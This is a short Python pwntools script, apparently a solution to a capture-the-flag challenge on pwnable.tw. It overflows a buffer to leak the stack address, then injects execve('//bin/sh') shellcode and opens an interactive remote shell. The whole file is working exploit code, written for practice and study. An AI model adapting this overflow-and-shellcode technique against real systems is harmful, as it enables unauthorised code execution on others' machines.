#!/usr/bin/env python

from pwn import *

# First step:
# Leak the esp address since ASLR is active
# but the code is not PIE and have no library imported

filler = b"A"*5*4

leak_addr = 0x08048087

leaker = filler + p32(leak_addr)

assert len(leaker) <= 60

r = remote("chall.pwnable.tw",10000)

print(r.readuntil(":"))

with open("leaker.bin","wb") as f:
    f.write(leaker)

r.send(leaker)

esp_addr = u32(r.recv(4))

print("The esp address is %s"%hex(esp_addr))

# Now that we have the esp we can use it to point
# the return address to our gadget

# sys_execve("//bin/sh",0,0)
gadget = """
xor eax, eax
push eax
push 0x68732f6e
push 0x69622f2f
mov ebx, esp
xor ecx, ecx
mov edx, ecx
mov eax, 0xb
int 0x80
""" 

pwner  = filler + p32(esp_addr + 20) + asm(gadget)

assert len(pwner) <= 60

r.send(pwner)

r.interactive()
